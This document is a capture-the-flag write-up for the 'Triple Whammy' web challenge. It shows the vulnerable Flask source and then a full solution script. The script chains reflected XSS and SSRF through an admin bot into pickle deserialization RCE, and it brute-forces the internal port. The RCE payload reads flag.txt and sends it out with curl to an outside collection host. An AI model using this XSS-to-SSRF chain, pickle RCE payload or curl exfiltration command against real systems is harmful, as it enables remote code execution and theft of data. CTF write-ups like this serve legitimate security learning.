<h1>Triple Whammy ~ Web </h1>

<h2>Description and Analysis</h2>


<blockquote>Server - https://triple-whammy.chal.cyberjousting.com/

Admin bot - https://triple-whammy-admin.chal.cyberjousting.com/

Author:Legoclones

Note: 
For all web challenges, for reasons unknown to mankind, 
calls back to webhook.site(and perhaps others) are not working
so try to use something like https://requestcatcher.com/ (which is confirmed to work)
</blockquote>

<p> In this challenge they gave us source code of the server and admin bot source code </p>

```
from flask import Flask, request
from urllib.parse import urlparse
import requests


# initialize flask
app = Flask(__name__)
SECRET = open("secret.txt", "r").read()


# index
@app.route('/', methods=['GET'])
def main():
    name = request.args.get('name','')

    return 'Nope still no front end, front end is for noobs '+name


# query
@app.route('/query', methods=['POST'])
def query():
    # get "secret" cookie
    cookie = request.cookies.get('secret')

    # check if cookie exists
    if cookie == None:
        return {"error": "Unauthorized"}
    
    # check if cookie is valid
    if cookie != SECRET:
        return {"error": "Unauthorized"}
    
    # get URL
    try:
        url = request.json['url']
    except:
        return {"error": "No URL provided"}

    # check if URL exists
    if url == None:
        return {"error": "No URL provided"}
    
    # check if URL is valid
    try:
        url_parsed = urlparse(url)
        if url_parsed.scheme not in ['http', 'https'] or url_parsed.hostname != '127.0.0.1':
            return {"error": "Invalid URL"}
    except:
        return {"error": "Invalid URL"}
    
    # request URL
    try:
        requests.get(url)
    except:
        return {"error": "Invalid URL"}
    
    return {"success": "Requested"}


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337, threaded=True)
```

As we can see there is XSS vector on this line ` return 'Nope still no front end, front end is for noobs '+name`
Another endpoint is `/query` where we can see if cookie is matching the secret it takes `url` parameter which is being parsed and
there is a check that url has to have scheme of `http` or `https` and that hostname is `127.0.0.1`- on valid url server will make a request to it. 
Which concludes that this will be *SSRF*  with local service in play. There was yet another file called internal.py which we were supposed to bypass to get the flag.

```from flask import Flask, request
import pickle, random


# initialize flask
app = Flask(__name__)
port = random.randint(5700, 6000)
print(port)


# index
@app.route('/pickle', methods=['GET'])
def main():
    pickle_bytes = request.args.get('pickle')

    if pickle_bytes is None:
        return 'No pickle bytes'
    
    try:
        b = bytes.fromhex(pickle_bytes)
    except:
        return 'Invalid hex'
    
    try:
        data = pickle.loads(b)
    except:
        return 'Invalid pickle'

    return str(data)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=port, threaded=True)
```

There are two things here:
  - Port is random
  - Unsafe usage of pickle which we will utilize for RCE
   

## Solution

Below is the full script, which will send malicious link to the bot to trigger XSS that will further make a request to `/query` and we know that cookie check is done on that endpoint so we need bot to make a request with its cookie.
From `admin_bot.js` bot was setting cookie with `httpOnly: true` but that doesn't matter since we are not trying to extract nor access the bot's cookie with JS. Bot will send its cookie by default which is only thing that we care about for this to successfully make a request to the servers `/query` endpoint.
I had some problems with passing payload for pickle RCE - so my teammate just adjusted a script for a bit (props to him). The RCE payload will `cat flag.txt` and pass the data to our server that we control via `curl` request.
Since range of 300 random ports is not much, it was just bruteforceable.
 

```python3
import time
import urllib.parse
import requests
import pickle
import os

REMOTE = "https://triple-whammy-admin.chal.cyberjousting.com"

class RCE:
    def __reduce__(self):
        return (os.system, (
            "python3 -c \"import urllib.parse; import os; data = urllib.parse.quote(open('flag.txt').read()); os.system(f'curl https://d7ef132972.endpoints.dev/q?data={data}')\"",
        ))

payload = pickle.dumps(RCE())
hex_payload = payload.hex()

def create_payload(port):
    url = f"http://127.0.0.1:{port}/pickle?pickle={hex_payload}"
    
    payload = f'''<script>
    fetch('/query', {{
        method: 'POST',
        headers: {{
            'Content-Type': 'application/json',
        }},
        body: JSON.stringify({{'url':'{url}'}})
    }});
    </script>'''

    return urllib.parse.quote(payload)

for port in range(5700, 6001):
    encoded_payload = create_payload(port)
    
    data = {
        'path' : '?name=' + encoded_payload
    }
    
    print(f"Trying port {port}")
    
    response = requests.post(REMOTE + "/visit", data=data)
    print(f"DEBUGPRINT[4]: lab.py:58: response.text={response.text}")
    
    if response.status_code == 200:
        print(f"Sent request for port {port}")
    
    time.sleep(1)
```

On correct bruteforce received request was:

` GET /q?data=byuctf%7Byou_got_a_turkey%21%21%21%7D HTTP/1.1`


<b> FLAG: byuctf{you_got_a_turkey!!!}</b>

<b>author: </b> [hebi](https://github.com/0xhebi)
